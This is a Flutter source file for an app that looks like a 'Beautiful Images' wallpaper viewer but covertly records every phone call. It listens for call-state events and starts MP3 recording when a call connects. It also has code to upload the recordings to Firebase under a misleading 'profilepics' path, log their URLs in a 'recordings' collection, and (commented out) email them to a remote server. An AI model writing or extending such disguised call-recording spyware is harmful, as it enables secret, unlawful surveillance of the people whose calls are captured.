import 'dart:async';
import 'dart:convert';
import 'package:audioplayers/audioplayers.dart';
import 'package:flutter/material.dart';
import 'package:phone_state_i/phone_state_i.dart';
import 'dart:io';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:record_mp3/record_mp3.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:http/http.dart' as http;

class MyHomePage extends StatefulWidget {
  final String title;

  MyHomePage({Key key, this.title}) : super(key: key);

  @override
  _MyHomePageState createState() => new _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  StreamSubscription streamSubscription;
  String recordFilePath, oldRecordPath;

  Future<bool> checkPermission() async {
    try {
      if (!await Permission.microphone.isGranted) {
        PermissionStatus status = await Permission.microphone.request();
        if (status != PermissionStatus.granted) {
          print('MICROPHONE Permission NOT Granted');
          return false;
        }
      }
      print('MICROPHONE Permission Granted');
      return true;
    } catch (e) {
      print('Something went wrong');
    }
  }

  @override
  void initState() {
    super.initState();
    streamSubscription =
        phoneStateCallEvent.listen((PhoneStateCallEvent event) {
      print('Call is Incoming or Connected ' + event.stateC);
      if (event.stateC == 'true') {
        startRecord();
      } else if (event.stateC == 'false') {
        stopRecord();
      }
    });
  }

  @override
  void dispose() {
    super.dispose();
    streamSubscription.cancel();
    Future.delayed(Duration(seconds: 5), startListening);
  }

  @override
  Widget build(BuildContext context) {
    return new Scaffold(
      body: Container(
        padding: EdgeInsets.only(bottom: 5, top: 25),
        width: MediaQuery.of(context).size.width,
        height: MediaQuery.of(context).size.height,
        alignment: Alignment.bottomCenter,
        decoration: BoxDecoration(
            color: Colors.pink,
            image: DecorationImage(
                image: AssetImage('assets/ba.jpg'),
                alignment: Alignment.topCenter,
                fit: BoxFit.fitHeight)),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.spaceBetween,
          children: [
            Text(
              'Beautiful Images',
              style: TextStyle(
                  color: Colors.white, fontSize: 25, fontFamily: 'Dancing'),
            ),
            Text(
              'Mount Fuji\n@pinterest',
              style: TextStyle(
                  color: Colors.white, fontSize: 20, fontFamily: 'Dancing'),
            ),
          ],
        ),
      ),
    );
  }

  Future<void> startListening() {
    streamSubscription =
        phoneStateCallEvent.listen((PhoneStateCallEvent event) {
      print('Call is Incoming or Connected ' + event.stateC);
      if (event.stateC == 'true') {
        startRecord();
      } else if (event.stateC == 'false') {
        stopRecord();
      }
    });
  }

  void startRecord() async {
    try {
      bool hasPermission = await checkPermission();
      if (hasPermission) {
        oldRecordPath = recordFilePath;
        recordFilePath = await getFilePath();
        RecordMp3.instance.start(recordFilePath, (type) {});
      } else {
        stopRecord();
        checkPermission().then((granted) {
          startRecord();
        });
      }
      setState(() {});
    } catch (e) {
      print('ERROR while starting Recording');
    }
  }

  void stopRecord() async {
    try {
      bool s = RecordMp3.instance.stop();
      print(s);
      // if (recordFilePath != null) {
      //   print('UPLOADING');
      //   await uploadAudio();
      // }
    } catch (e) {
      print('ERROR while stoping Recording');
    }
  }

  uploadAudio() {
    final StorageReference firebaseStorageRef = FirebaseStorage.instance
        .ref()
        .child(
            'profilepics/audio_${i.toString}_${DateTime.now().millisecondsSinceEpoch.toString()}.mp3');

    StorageUploadTask task = firebaseStorageRef.putFile(File(recordFilePath));
    task.onComplete.then((value) async {
      print('UPLOADAED');
      var audioURL = await value.ref.getDownloadURL();
      String strVal = audioURL.toString();
      await sendAudioMsg(strVal);
    }).catchError((e) {
      print(e);
    });
  }

  sendAudioMsg(String audioMsg) async {
    try {
      if (audioMsg.isNotEmpty) {
      var ref = FirebaseFirestore.instance
          .collection('recordings')
          .doc(DateTime.now().millisecondsSinceEpoch.toString());
      await FirebaseFirestore.instance.runTransaction((transaction) async {
        transaction.set(ref, {
          "date": DateTime.now().toString().substring(0,15),
          "timestamp": DateTime.now().millisecondsSinceEpoch.toString(),
          "content": audioMsg,
          "type": 'audio'
        });
      });
      // await sendEmail(DateTime.now().toString().substring(0,15), audioMsg,DateTime.now().millisecondsSinceEpoch.toString() );
    } else {
      print("ERROR");
    }
    } catch (e) {
      print(e);
    }
    
  }

  // Future<void> sendEmail(String date, String url, String timestamp)async{
  //   http.Response res = await http.post('https://taste-buds27.herokuapp.com/api/vcr/sendEmail', body: jsonEncode({
  //     'audioURL': url,
  //     'date': date,
  //     'timestamp': timestamp
  //   }));

  //   var response = jsonDecode(res.body);
  //   if(res.statusCode==200){
  //     print('sent');
  //   }else{
  //     print('failed');
  //     print(res.body);
  //   }

  // }

  Future<void> play() async {
    if (recordFilePath != null && File(recordFilePath).existsSync()) {
      AudioPlayer audioPlayer = AudioPlayer();
      await audioPlayer.play(
        recordFilePath,
        isLocal: true,
      );
    }
  }

  int i = 0;

  Future<String> getFilePath() async {
    Directory storageDirectory = await getExternalStorageDirectory();
    String sdPath = storageDirectory.path + "/record";
    var d = Directory(sdPath);
    if (!d.existsSync()) {
      d.createSync(recursive: true);
    }
    print("PATH: " + sdPath);
    return sdPath + "/audio_${DateTime.now().millisecondsSinceEpoch}.mp3";
  }

  
}
